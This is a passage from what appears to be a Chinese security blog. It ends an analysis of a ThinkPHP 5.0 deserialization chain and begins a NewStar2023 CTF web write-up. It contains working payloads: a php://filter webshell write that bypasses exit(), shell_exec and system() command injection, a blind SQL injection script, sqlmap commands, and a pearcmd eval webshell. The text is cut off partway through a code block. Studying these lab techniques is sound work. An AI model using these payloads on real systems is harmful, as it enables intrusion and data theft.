src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702383452619-335e2d8b-8178-46ec-87e6-bf8d4f2f2b1d.png" alt="img"></p><p>第一个断点至此先说到这里 我们继续跟进第二个断点</p><p>是对<code>$value</code>进行赋值</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702383592936-3f2e8136-b869-4562-ac0c-0e816bcffd14.png" alt="img"></p><p>这里有一个很长的if条件语句的判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent))</span><br></pre></td></tr></table></figure><p>我们一部分一部分来看</p><p>条件一：</p><p>之前我们5.1版本的时候在<code>__toSring</code>这一部分的时候是触发了__call方法，那么我们在这的目标也是去寻找合适的call方法，那么最终是找到了<code>think\console\Output</code>我们应该让这个方法返回一个output对象 这样等我们出去之后 执行<code>$value-&gt;getAttr($attr)</code>就会触发<code>__call()</code>；额，因此这里value的值为<code>$this-parent</code>，所以我们需要赋值为一个output对象</p><p>条件二：</p><p>$modelRelation我们已经对它赋值了HasOne对象了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384075250-485d27df-567b-42e4-909f-c9373ac7cc21.png" alt="img"></p><p>我们跟进<code>isSelfRelation()</code>方法 它是Relation类的一个方法</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384182743-0270df5d-fc44-408e-9f9a-6def2b02dbb4.png" alt="img"></p><p>而OneToOne是它的子类 <img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384248249-c1f53c2f-f63c-4258-a3c5-9e277eace62c.png" alt="img"></p><p>HasOne是OneToOne的一个子类<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384300728-5a488be0-ad20-48a0-a430-fc24575a168b.png" alt="img"></p><p>因此我们控制<code>HasOne-&gt;selfRelation</code>为false即可</p><p>条件三：<code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</code></p><p>之前我们说到让<code>$this-&gt;parent</code>为一个Output对象即可 因此这里条件成立的就是让<code>$modelRelation-&gt;getModel()</code>返回一个output对象</p><p>我们跟进这个函数观察一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384583595-25a71b36-479a-4fa7-9850-231cb4feb500.png" alt="img"></p><p>那么思路就是看看哪个类使用了同名getModel函数 并且方法我们可控</p><p>那么最后找到是Query类</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384728365-53145e1f-2749-4e58-b5f2-7ad47555d27e.png" alt="img"></p><p>因此我们这里只需要<code>$this-&gt;query</code>为Query的一个对象即可 </p><p>那么三个条件均满足 然后<code>$value = $this-&gt;parent</code>我们就出来了</p><p>接着进入第三个断点</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384867170-96542676-a086-45fc-a7c7-78f0cbc455e0.png" alt="img"></p><p>这里<code>$modelRelation</code>是HasOne对象 调用它的getBindAttr方法 其实它没有 调用的是它的父类OneToOne的方法</p><p>返回一个数组<code>[&quot;a&quot;=&gt;&quot;admin&quot;]</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385130534-ca593a2e-d4ec-4b2a-8262-b6f7d678259c.png" alt="img"></p><p>出来之后 我们对bindAttr数组做了遍历 取出了admin值 并且赋值给<code>$attr</code> 准备进入__call方法</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385270965-3c8c5977-cfd1-4096-8fe1-d43c5971ce20.png" alt="img"></p><p>value为Output对象 attr为admin</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385400098-cb29f0b7-7658-41ce-971d-6192d5f6fed5.png" alt="img"></p><p>继续跟进</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385455272-facd2168-2893-44ce-818c-5addd49162ca.png" alt="img"></p><p>用array_unshift函数将方法名也就是getAttr加到参数数组中 最后为<code>[&quot;getAttr&quot;,&quot;admin&quot;]</code></p><p>然后用<code>call_user_func_array()</code>调用自己的block方法</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385660127-4ad92565-a9da-4a18-b38e-213780816b13.png" alt="img"></p><p>跟进该方法 调用了writeln方法 并且值为我们当作参数传入的数组内容</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385812207-c646114f-7e0f-4319-9968-573f7108e987.png" alt="img"></p><p>继续跟进writeln 又调用了write方法</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385868106-38a09ecb-7388-41df-a310-a79fb86b0fd0.png" alt="img"></p><p>那么我们全局搜索看看谁调用了write函数 在Memcached类找到了合适的write方法</p><p>因此让Output类中<code>$this-&gt;handler</code>为Memecached对象即可 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702386253172-ce3e25a5-224c-4c7f-af89-35174a14bc81.png" alt="img"></p><p>这里又调用了set方法 我们继续set方法</p><p>最后发现File类中调用了set方法 所以这里我们让Memcache类中的<code>$this-&gt;handler</code>为File对象即可</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702386333208-33809789-92e0-4574-a19d-1f4c14c2760c.png" alt="img"></p><p>继续向下走 我们可以看到这里有直接写php🐎的语句 但是有死亡exit()我们可以利用编解码绕过 <code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php</code></p><p>这里就不过多赘述了 参考：<a href="https://www.cnblogs.com/meng-han/p/16849600.html">https://www.cnblogs.com/meng-han/p/16849600.html</a></p><p>然后还有<code>file_put_contents()</code> 危险函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702386596117-accfef1b-456e-4185-af8b-d5cd89c25aa6.png" alt="img"></p><p><code>$filename</code>通过<code>getCacheKey</code>函数获得的 我们跟进</p><p>这里的name为我们之前参数数组中两个值getAttr和admin拼接的 然后计算其md5值赋值为<code>$name</code></p><p>为<code>63ac11a7699c5c57d85009296440d77a</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387227854-b8616d60-99b4-4d13-928f-2bbaed760a6a.png" alt="img"></p><p>接着到<code>$this-&gt;options[&#39;path&#39;]</code> 这里我们是可控的 也就是文件名我们可控 设置为我们的特殊编解码paylaod</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387307842-5b351ecc-b1bb-49be-800b-f6629a6202ab.png" alt="img"></p><p>文件最终名为<code>$name</code> 也就是之前计算的md5值 再加上<code>$this-&gt;options[&#39;path&#39;]</code>两部分构成的</p><p>为<code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php63ac11a7699c5c57d85009296440d77a.php</code></p><p>虽然此时我们文件名可控了但是<code>$value</code>为true 也就是文件内容<code>$data</code>我们不可控 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387750421-cc16d9f2-abcd-4aae-b13b-45c0f2ea3ba7.png" alt="img"></p><p>继续分析这里会调用setTagItem这个函数 我们跟进观察</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387860334-4f4aa100-87e2-40ed-8cbe-64c36ed272a7.png" alt="img"></p><p>该函数又会调用一次set函数 那么此时<code>$value</code>的值我们是可控的 也就是传进来的<code>$name</code>也就是<code>$filename</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387939980-8e0ce116-2027-4287-a7db-6b69ee7afffb.png" alt="img"></p><p>那么此时传入set的<code>$name</code>为<code>$key=tag_c4ca4238a0b923820dcc509a6f75849b</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702388521425-d31d2d3d-c5e0-4c87-8991-4cc6f1569117.png" alt="img"></p><p>但是这里还有一个问题 就是exit()死亡函数的绕过 我们写入文件的内容受到这个函数的影响</p><p>并且内容就是我们的文件名 因此只需要我们将文件名构造为特殊的可以吞掉exit()的编码即可</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702388214099-8cb10a8d-65bb-4999-98b7-64f2f9e0a06d.png" alt="img"></p><p>所以会生成两个文件 只有第二个文件内容才是我们想要的</p><p>并且第二个文件名为<code>&quot;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php3b58a9545013e88c7186db11bb158c44.php&quot;+md5(tag_c4ca4238a0b923820dcc509a6f75849b).php</code></p><p>产出的文件名为：<code>a.php3b58a9545013e88c7186db11bb158c44.php</code></p><p>这里文件名也有讲究 我们可以看到我们的文件名应该是<code>aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php3b58a9545013e88c7186db11bb158c44.php&quot;+md5(tag_c4ca4238a0b923820dcc509a6f75849b).php</code>这一坨才对 </p><p>最后为什么只生成了我们想要的<code>a.php3b58a9545013e88c7186db11bb158c44.php</code></p><p>我们将前面的一串base64字符整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成<code>a.php3b58a9545013e88c7186db11bb158c44.php</code>文件，从而就可以生成正常的文件名。</p><p>参考：<a href="https://www.freebuf.com/articles/web/266565.html">探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户</a></p><p>再偷一份包浆整个流程图片 整理整理思路</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702442525365-18698891-316b-463a-8ea6-710d2f50fedd.png" alt="img"></p><p>至此分析完美撒花</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>不能只是一味的为了解题而去刷题不去深究真正的漏洞原因</p><p>看了很多厉害师傅的博客 深深的e住了</p><p>不把屎一样的东西搬出来抽象了 放在雨雀上自己看看就好了</p><p>这也是为什么停了博客一个月了qwq，深思中。。。</p><p>还有就是期末了 也e 要给时间复习了</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%BA%94%E3%80%81ThinkPHP5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">ThinkPHP5.x反序列化漏洞全复现 - Boogiepop Doesn’t Laugh</a></p><p><a href="https://xz.aliyun.com/t/6619#toc-1">thinkphp5.1.x~5.2.x版本反序列化链挖掘分析 - 先知社区</a></p><p><a href="https://www.freebuf.com/articles/web/266565.html">探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户</a></p>]]></content>
      
      
      <categories>
          
          <category> -漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStar2023 WEB WP</title>
      <link href="/post/dcc8a51b.html"/>
      <url>/post/dcc8a51b.html</url>
      
        <content type="html"><![CDATA[<p>小阶段完成</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>经过五周的比赛，恭喜NewStar2023(校内赛道)圆满结束了 <em>★,°</em>:.☆(￣▽￣)&#x2F;$:<em>.°★</em> 。</p><p>这里是Z1d10t的WEB方向题解</p><p>3题未解出 还是太菜了qwq </p><p>日后会更加努力！</p><h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p>报错之后能看到是flask框架的 然后就能得到源码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695620310236-6bbb4213-7832-4c9e-9cb6-972e12f682a9.png" alt="img"></p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p>正常考察请求头参数</p><h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695620090015-6e93ad0d-5ec6-45c3-bfb9-f7aee7d97337.png" alt="img"></h1><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>前端检测绕过</p><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>&#x2F;<a href="http://www.zip源码泄露/">www.zip源码泄露</a></p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>get：<code>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5=2024%00</code></p><p>post：<code>key3[]=3&amp;flag5[]=1</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695617294020-eb01d6c9-c990-44a4-83a4-c33e9eb85046.png" alt="img"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=114514&amp;e[v.a.l=var_dump(shell_exec(&#x27;more /f*&#x27;));</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695616213122-0044da95-b172-405b-a1c9-c98cee6536c7.png" alt="img"></p><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p>爆破的时候会获得一条一条的提示 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> The password is randomly selected <span class="keyword">from</span> a <span class="keyword">list</span></span><br><span class="line"></span><br><span class="line"> 这个密码恰如题目简介，一分不多，一分不少</span><br><span class="line"></span><br><span class="line">Is your password weak?</span><br></pre></td></tr></table></figure><p>一开始一直以为 <code>这个密码恰如题目简介，一分不多，一分不少</code>的意思是密码9位 但是之后和出题人聊了之后 和这个根本没关系 只想表达是弱口令密码 </p><p>密码是000000 当然记得要通过md5加密之后再爆破</p><p>登录然后放掉这个包 然后还会跳转到一个包 就能获得密码 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695629472388-c783f834-6097-4b10-bd61-f366c4983399.png" alt="img"></p><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>修改得分即可</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696172672213-98b769f1-a424-4a00-a451-3095c4137adb.png" alt="img"></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>手动注个jb sqlmap一把梭就行了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="comment">//90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 --dbs</span></span><br><span class="line">[*] ctf</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line">[*] test</span><br><span class="line"></span><br><span class="line">sqlmap -u http:<span class="comment">//90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 -D ctf --tables</span></span><br><span class="line"> grades       |</span><br><span class="line">| here_is_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u http:<span class="comment">//90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 -D ctf -T here_is_flag --columns</span></span><br><span class="line"> flag   | varchar(<span class="number">255</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u http:<span class="comment">//90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 -D ctf -T here_is_flag -C &quot;flag&quot; --dump</span></span><br></pre></td></tr></table></figure><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p>考点：</p><ul><li>htaccess</li></ul><p>很基础</p><h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><p>考点:</p><ul><li>php反序列化</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">evil</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> $cmd=<span class="string">&#x27;nl /th1s_1s_fffflllll4444aaaggggg&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__destruct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, $<span class="built_in">this</span>-&gt;cmd))&#123;</span><br><span class="line">            <span class="meta">@system($this-&gt;cmd)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">evil</span>();</span><br><span class="line">echo <span class="title function_">urlencode</span><span class="params">(serialize($a)</span>);</span><br><span class="line">?&gt;</span><br><span class="line">#O%3A4%3A%22evil%<span class="number">22</span>%3A1%3A%7Bs%3A9%3A%<span class="number">22</span>%00evil%00cmd%<span class="number">22</span>%3Bs%3A33%3A%22nl+%2Fth1s_1s_fffflllll4444aaaggggg%<span class="number">22</span>%3B%<span class="number">7D</span></span><br></pre></td></tr></table></figure><h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><p>禁了base所以不能用常用的base64转码了 换种转码方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696171708476-0624b883-3c25-461c-8127-7f163a4bab2e.png" alt="img"></p><p>再解码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span></span><br><span class="line"><span class="variable">$str</span> <span class="operator">=</span> <span class="string">&quot;?&lt;hp p//lfga5&#123;719c28-e567c4-d9-1dab5e-7c6326be71&#125;9&quot;</span>;</span><br><span class="line">echo <span class="title function_">iconv</span><span class="params">(<span class="string">&#x27;UCS-2BE&#x27;</span>, <span class="string">&#x27;UCS-2LE&#x27;</span>, $str)</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696171733094-68be6a56-67e1-45ab-88fa-8df2ea9eb0ad.png" alt="img"></p><h2 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p>考点:</p><ul><li>git泄露</li><li>无参rce</li></ul><p>首先获得源码 得到<code>/bo0g1pop.php</code>路由</p><p>得到源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,$_GET[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        eval($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">GET /bo0g1pop.php?star=system(next(getallheaders())); HTTP/<span class="number">1.1</span></span><br><span class="line">Host: 18e0aabc-<span class="number">695f</span>-46fd-b4e2-3557e66a3cdc.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: cat /flag</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure><p>利用User-Agent字段进行构造rce</p><h1 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h1><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>考察：</p><ul><li>sql盲注</li></ul><p>直接sqlmap level3梭哈或者自己写个脚本（沙贝是自己）</p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> <span class="type">time</span></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&#x27;http://3984f01f-9843-4df0-a21f-95a7eff68063.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">1</span>,<span class="number">50</span>)</span>:</span><br><span class="line">    low=<span class="number">31</span></span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=high:</span><br><span class="line">        paylaod = <span class="string">&quot;TMP0929&#x27;And/**/0^(Ascii(Substr((Select(flag)from(ctf.here_is_flag)),&#123;&#125;,1))&gt;&#123;&#125;)%23&quot;</span>.format(i,mid)</span><br><span class="line">        #爆库爆数据语句差不多 关键字被ban大写绕过就行</span><br><span class="line">        r = requests.get(url+<span class="string">&quot;?id=&quot;</span>+paylaod)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;English&quot;</span> in r.text):</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high)<span class="comment">//2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid-<span class="number">1</span></span><br><span class="line">            mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    result+=chr(high+<span class="number">1</span>)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h2 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h2><p>考点:</p><ul><li>pearcmd</li></ul><p>根据提示</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697164131734-b78abbc2-ee62-4767-965e-11accdbf5e48.png" alt="img"></p><p><code>register_argc_argv</code>是on</p><p>那么<code>register_argc_argv</code>是什么呢 </p><p>简单说<code> register_argc_argv</code>开启时我们传入get的参数会被记录在<code>$_SERVER</code>这个全局变量数组中</p><p>并且$argc变量是⽤于记录数组的⼤⼩ $argv变量是⽤于记录输⼊的参数</p><p>条件：</p><ul><li>⽼版本（测试版本为5.2.17）默认为 On</li><li>新版本（测试版本为 5.4.45、5.5.9、7.3.4）默认为 Off</li></ul><p>我们要传入如果正常传入参数，数组的大小永远是1</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697165693345-4172a348-e3bd-473c-b24a-303757cc3b1e.png" alt="img"></p><p>如果要表示两个数组，需要用+隔开</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697165707316-253cea3f-c08e-4f2d-b928-46805a4bceee.png" alt="img"></p><p>来自：</p><p><a href="https://www.shawroot.cc/1643.html">https://www.shawroot.cc/1643.html</a></p><p><a href="https://cloud.tencent.com/developer/article/2204400?areaId=106001">https://cloud.tencent.com/developer/article/2204400?areaId=106001</a></p><p>一般这个搭配pearcmd使用 写马到网站根目录下 然后包含rce即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure><p>记得要抓一次包重写一下一句话木马 不然会被转码导致不成功</p><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>考点：</p><ul><li>php反序列化</li></ul><p>源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>;</span><br><span class="line"></span><br><span class="line"><span 